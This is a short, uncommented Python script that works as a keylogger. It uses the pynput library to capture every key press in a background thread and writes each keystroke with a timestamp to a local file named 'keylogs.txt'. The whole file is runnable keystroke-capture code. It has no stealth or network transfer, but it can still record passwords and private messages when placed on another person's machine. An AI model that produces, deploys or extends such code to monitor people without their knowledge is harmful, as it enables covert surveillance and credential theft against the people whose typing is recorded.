import threading
from pynput.keyboard import Key, Listener
import logging

log_dir = ""
FILE_NAME = "keylogs.txt"
period = 0.1 
logging.basicConfig(filename=(log_dir+FILE_NAME), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def keyboard_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    listener_thread = threading.Thread(target=keyboard_listener)
    listener_thread.start()